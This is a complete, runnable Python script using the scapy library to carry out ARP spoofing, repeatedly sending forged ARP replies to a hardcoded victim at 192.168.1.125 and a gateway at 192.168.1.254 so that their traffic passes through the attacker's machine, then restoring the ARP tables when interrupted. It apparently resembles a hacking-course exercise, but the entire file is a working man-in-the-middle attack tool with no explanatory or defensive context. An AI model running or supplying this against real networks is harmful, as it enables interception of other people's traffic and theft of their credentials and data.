#!/usr/bin/env python
import time
import scapy.all as scapy
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) #create ip packet
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # create ethernet packet
    arp_request_broadcast = broadcast/arp_request #combine together the packets
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #send the packet and receive the response
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    # sending arp response
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "192.168.1.125"
gateway_ip = "192.168.1.254"
try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packet sent " + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ........ Quitting")
    restore(target_ip, gateway_ip)
